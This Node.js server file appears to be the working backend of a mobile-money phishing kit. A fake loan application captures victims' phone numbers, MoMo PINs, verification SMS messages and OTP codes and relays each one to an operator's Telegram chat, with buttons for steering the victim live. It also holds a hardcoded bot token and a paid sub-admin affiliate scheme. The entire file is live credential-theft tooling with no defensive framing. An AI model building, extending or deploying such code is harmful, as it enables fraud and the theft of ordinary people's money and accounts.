const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("ERROR: Main Telegram Bot Token is missing.");
} else {
    console.log("Initializing Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('Polling Error:', error.code, error.message);
});

let activeSessions = {};
let registeredAdmins = new Map();

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

function getOrCreateAdmin(userIdStr, firstName, username) {
    if (!registeredAdmins.has(userIdStr)) {
        registeredAdmins.set(userIdStr, {
            firstName: firstName || 'Admin',
            username: username || 'No username set',
            lastSeen: new Date().toLocaleString(),
            isBlocked: false
        });
    } else {
        const info = registeredAdmins.get(userIdStr);
        if (firstName) info.firstName = firstName;
        if (username) info.username = username;
        info.lastSeen = new Date().toLocaleString();
    }
    return registeredAdmins.get(userIdStr);
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    getOrCreateAdmin(userIdStr, firstName, username);

    if (msg.text.startsWith('/activate')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }
        const targetId = msg.text.replace('/activate', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "Provide a Chat ID. Example:\n`/activate 123456789`", { parse_mode: "Markdown" });
            return;
        }
        const adminData = getOrCreateAdmin(targetId, 'Sub-Admin', 'N/A');
        adminData.isBlocked = false;
        mainBot.sendMessage(chatId, `Activated sub-admin \`${targetId}\` (${escapeMarkdown(adminData.firstName)}).`, { parse_mode: "Markdown" });
        mainBot.sendMessage(targetId, "*Your link has been activated by Main Admin.*", { parse_mode: "Markdown" }).catch(() => {});
        return;
    }

    if (msg.text.startsWith('/payment')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }
        const targetId = msg.text.replace('/payment', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "Provide a Chat ID. Example:\n`/payment 123456789`", { parse_mode: "Markdown" });
            return;
        }
        if (targetId === MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Cannot block Main Admin.");
            return;
        }
        const adminData = getOrCreateAdmin(targetId, 'Sub-Admin', 'N/A');
        adminData.isBlocked = true;
        mainBot.sendMessage(chatId, `Blocked sub-admin \`${targetId}\` (${escapeMarkdown(adminData.firstName)}) via /payment.`, { parse_mode: "Markdown" });
        mainBot.sendMessage(targetId, "*Message delivery paused pending payment confirmation.*", { parse_mode: "Markdown" }).catch(() => {});
        return;
    }

    if (msg.text.startsWith('/all')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "Access denied: Main Admin only.");
            return;
        }

        let report = `*ALL REGISTERED SUB-ADMINS*\n\n`;
        let idx = 0;

        registeredAdmins.forEach((data, id) => {
            if (id === MAIN_ADMIN_ID) return;
            idx++;
            const state = data.isBlocked ? "Dormant / Blocked" : "Active";
            report += `${idx}. *${escapeMarkdown(data.firstName)}* (${escapeMarkdown(data.username)})\n` +
                      `   ID: \`${id}\`\n` +
                      `   Status: *${state}*\n` +
                      `   Last Seen: ${escapeMarkdown(data.lastSeen)}\n\n`;
        });

        if (idx === 0) {
            report += "No sub-admins registered yet.";
        }

        mainBot.sendMessage(chatId, report, { parse_mode: "Markdown" });
        return;
    }

    if (msg.text.startsWith('/start')) {
        sendAdminLink(chatId, userIdStr, firstName, username);
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const text = `*ADMIN PORTAL LINK READY*\n\n` +
        `*Name:* ${escapeMarkdown(firstName)}\n` +
        `*Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `*Username:* ${escapeMarkdown(username)}\n\n` +
        `*Permanent Link:*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, text, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        const parts = data.split('_');
        const action = parts[0];
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Session expired or not found.", show_alert: true });
            return;
        }

        if (session.targetAdmin !== userIdStr) {
            botInstance.answerCallbackQuery(query.id, { text: "Unauthorized for this session.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied_pin';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'smsexpired') session.status = 'sms_expired';
        else if (action === 'smsdone') session.status = 'sms_done';
        else if (action === 'otpexpired') session.status = 'otp_expired';
        else if (action === 'otpsuccess') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(() => {});

        botInstance.answerCallbackQuery(query.id).catch(() => {});
    });
}

setupCallbackHandler(mainBot);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, adminId, loanData } = req.body;

    let targetAdmin = MAIN_ADMIN_ID;
    if (adminId) {
        targetAdmin = adminId.toString().trim();
    }

    if (targetAdmin !== MAIN_ADMIN_ID) {
        const adminInfo = getOrCreateAdmin(targetAdmin);
        if (adminInfo.isBlocked) {
            return res.json({ success: true, sessionId, blocked: true });
        }
    }

    activeSessions[sessionId] = {
        phone,
        pin,
        loanData: loanData || {},
        targetAdmin,
        status: 'pending_pin_approval',
        submittedSMSList: []
    };

    const message = `*NEW MOMO PIN SUBMISSION*\n\n` +
        `*PHONE NO:* ${phone}\n` +
        `*PIN:* ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "ALLOW", callback_data: `allow_${sessionId}` },
                    { text: "DENY", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Error sending credentials:", err.message));

    res.json({ success: true, sessionId });
});

app.post('/api/submit-sms', (req, res) => {
    const { sessionId, smsText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, status: 'not_found' });
    }

    if (session.targetAdmin !== MAIN_ADMIN_ID) {
        const adminInfo = getOrCreateAdmin(session.targetAdmin);
        if (adminInfo.isBlocked) {
            return res.json({ success: true, blocked: true });
        }
    }

    const normalized = (smsText || '').trim();
    if (session.submittedSMSList.includes(normalized)) {
        return res.json({ success: false, duplicate: true, message: 'Duplicate SMS is not allowed.' });
    }

    session.submittedSMSList.push(normalized);
    session.lastSMS = normalized;
    session.status = 'pending_sms_review';

    const message = `*MOMO VERIFICATION SMS*\n\n` +
        `*PHONE NO:* ${session.phone}\n\n` +
        `*FULL SMS:*\n${normalized}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Copy SMS", copy_text: { text: normalized } }
                ],
                [
                    { text: "INCORRECT PIN", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS EXPIRED", callback_data: `smsexpired_${sessionId}` }
                ],
                [
                    { text: "DONE ✅", callback_data: `smsdone_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Error sending SMS alert:", err.message));

    res.json({ success: true });
});

app.post('/api/request-new-sms', (req, res) => {
    const { sessionId } = req.body;
    const session = activeSessions[sessionId];
    if (!session) {
        return res.json({ success: false });
    }

    if (session.targetAdmin !== MAIN_ADMIN_ID) {
        const adminInfo = getOrCreateAdmin(session.targetAdmin);
        if (adminInfo.isBlocked) {
            return res.json({ success: true, blocked: true });
        }
    }

    mainBot.sendMessage(
        session.targetAdmin,
        `*APPLICANT REQUESTED NEW SMS*\n\n*PHONE NO:* ${session.phone}`,
        { parse_mode: "Markdown" }
    ).catch(() => {});

    res.json({ success: true });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpCode } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, status: 'not_found' });
    }

    if (session.targetAdmin !== MAIN_ADMIN_ID) {
        const adminInfo = getOrCreateAdmin(session.targetAdmin);
        if (adminInfo.isBlocked) {
            return res.json({ success: true, blocked: true });
        }
    }

    session.otpCode = otpCode;
    session.status = 'pending_otp_review';

    const message = `*4-DIGIT MOMO OTP*\n\n` +
        `*PHONE NO:* ${session.phone}\n` +
        `*OTP:* ${otpCode}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "OTP EXPIRES", callback_data: `otpexpired_${sessionId}` },
                    { text: "SUCCES", callback_data: `otpsuccess_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error("Error sending OTP alert:", err.message));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
                
